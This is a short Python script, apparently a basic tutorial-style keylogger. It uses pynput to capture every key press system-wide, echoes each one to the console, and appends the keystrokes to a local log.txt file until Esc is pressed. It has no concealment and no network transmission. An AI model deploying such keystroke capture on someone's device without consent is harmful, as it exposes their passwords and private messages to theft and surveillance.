from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)

    if key == Key.space:
        write_file(keys)
        keys = []
    else:
        count += 1
        print("{0} is pressed".format(key))

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            if key == Key.space:
                f.write("\n")  # Add a new line after space bar
            else:
                f.write(str(key).replace("'", ""))  # Remove single quotes
        f.write(" ")  # Add a space between key sets

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
